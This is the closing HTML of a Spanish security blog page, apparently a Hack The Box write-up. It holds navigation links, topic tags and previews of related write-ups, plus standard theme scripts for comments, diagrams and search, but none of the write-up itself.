href="/posts/WriteUp-TimeLapse-HTB/">WriteUp TimeLapse HTB</a><li><a href="/posts/WriteUp-Noter-HTB/">WriteUp Noter HTB</a></ul></div><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ssti/">SSTI</a> <a class="post-tag" href="/tags/anonimato/">Anonimato</a> <a class="post-tag" href="/tags/attacks-backdoor/">Attacks/Backdoor</a> <a class="post-tag" href="/tags/burpsuite/">BurpSuite</a> <a class="post-tag" href="/tags/chattr/">chattr</a> <a class="post-tag" href="/tags/code-analyse/">Code-analyse</a> <a class="post-tag" href="/tags/command-injection/">command-injection</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a> <a class="post-tag" href="/tags/cve-2021-23639/">CVE-2021-23639</a> <a class="post-tag" href="/tags/cyberchef/">CyberChef</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contenido</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Lecturas adicionales</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/WriteUp-RedPanda-HTB/"><div class="card-body"> <em class="timeago small" data-ts="1669438800" > 2022-11-26 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>WriteUp RedPanda HTB</h3><div class="text-muted small"><p> Índice Información básica de la máquina Herramientas y recursos empleados Enumeración Buscando pandas rojos Explotando la vulnerabilidad SSTI mientras buscamos pandas rojos Ob...</p></div></div></a></div><div class="card"> <a href="/posts/WriteUp-Undetected-HTB/"><div class="card-body"> <em class="timeago small" data-ts="1656910800" > 2022-07-04 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>WriteUp Undetected HTB</h3><div class="text-muted small"><p> Índice Información básica de la máquina Herramientas-y-recursos-empleados Fase de enumeración Explotando fallo de PHP Unit (CVE-2017-9841) Privesc steven Privesc root Máquina Undetec...</p></div></div></a></div><div class="card"> <a href="/posts/WriteUp-Late-HTB/"><div class="card-body"> <em class="timeago small" data-ts="1659157200" > 2022-07-30 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>WriteUp Late HTB</h3><div class="text-muted small"><p> Índice Información básica de la máquina Herramientas y recursos empleados Enumeración Explotando la vulnerabilidad SSTI Escalando privilegios Transición de archivos Anal...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/WriteUp-RedPanda-HTB/" class="btn btn-outline-primary" prompt="Anterior"><p>WriteUp RedPanda HTB</p></a><div class="btn btn-outline-primary disabled" prompt="Nuevo"><p>-</p></div></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "rabb1t-0/rabb1t-0.github.io", "data-repo-id": "R_kgDOHL8JPA", "data-category": "general", "data-category-id": "DIC_kwDOHL8JPM4CPeS9", "data-mapping": "pathname", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "top", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/rabb1t-0">rabb1t</a>. <span data-toggle="tooltip" data-placement="top" title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ssti/">SSTI</a> <a class="post-tag" href="/tags/anonimato/">Anonimato</a> <a class="post-tag" href="/tags/attacks-backdoor/">Attacks/Backdoor</a> <a class="post-tag" href="/tags/burpsuite/">BurpSuite</a> <a class="post-tag" href="/tags/chattr/">chattr</a> <a class="post-tag" href="/tags/code-analyse/">Code-analyse</a> <a class="post-tag" href="/tags/command-injection/">command-injection</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a> <a class="post-tag" href="/tags/cve-2021-23639/">CVE-2021-23639</a> <a class="post-tag" href="/tags/cyberchef/">CyberChef</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
